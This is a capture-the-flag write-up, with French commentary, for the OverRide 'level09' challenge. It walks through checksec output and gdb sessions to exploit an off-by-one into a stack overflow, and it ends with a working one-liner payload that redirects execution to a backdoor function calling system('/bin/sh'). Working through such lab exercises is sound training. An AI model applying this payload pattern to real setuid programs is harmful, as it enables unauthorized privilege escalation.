RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
level09@OverRide:~$ file level09 
level09: setuid setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xa1a3a49786f29814c5abd4fc6d7a685800a3d454, not stripped

(gdb) info function secret_backdoor 
All functions matching regular expression "secret_backdoor":
Non-debugging symbols:
0x000055555555488c  secret_backdoor

Dans la fonction set_username, nous allons ecrire 41 bytes sur str+140 qui represente la variable utiliser dans set_msg pour stocker le msg, nous allons donc depasser de 1 byte sur la variable qui represente la taille du strncpy dans set_msg qui de base est de 1 octet

Nous pouvons voir qu'avec la commande suivante nous ecrasons la valeur de $save_eip.

(gdb) r <<< $(python -c "print 40 * 'a' + '\xff' + '\n' + 'A' * 2000")
Starting program: /home/users/level09/level09 <<< $(python -c "print 40 * 'a' + '\xff' + '\n' + 'A' * 2000")
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude

Breakpoint 2, 0x00005555555549c6 in set_msg ()
(gdb) c
Continuing.
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()
(gdb) x/i 0x0000555555554931
   0x555555554931 <handle_msg+113>:     ret
(gdb) i f
Stack level 0, frame at 0x7fffffffe5e8:
 rip = 0x555555554931 in handle_msg; saved rip 0x4141414141414141
 called by frame at 0x7fffffffe5f8
 Arglist at 0x4141414141414141, args: 
 Locals at 0x4141414141414141, Previous frame's sp is 0x7fffffffe5f0
 Saved registers:
  rip at 0x7fffffffe5e8

Il s'agit donc du save_eip de handle_msg() que nous ecrasons.

=> 0x00005555555549c6 <+148>:   call   0x555555554720 <strncpy@plt>
(gdb) x/wx $rdi
0x7fffffffe520: 0x0000000a
(gdb) p/d 0x7fffffffe5e8-0x7fffffffe520
$8 = 200

Nous constatons que l'adresse de save_eip de handle_msg() est a 200 bytes de l'adresse de destination ddu strncpy

Dans la fonction secret_backdoor il y a une derniere user_input ou le resultat ira en parametre de system()

(python -c "print 40 * 'a' + '\xd0' + '\n' + 'A' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n' + '/bin/sh'";cat) | ./level09
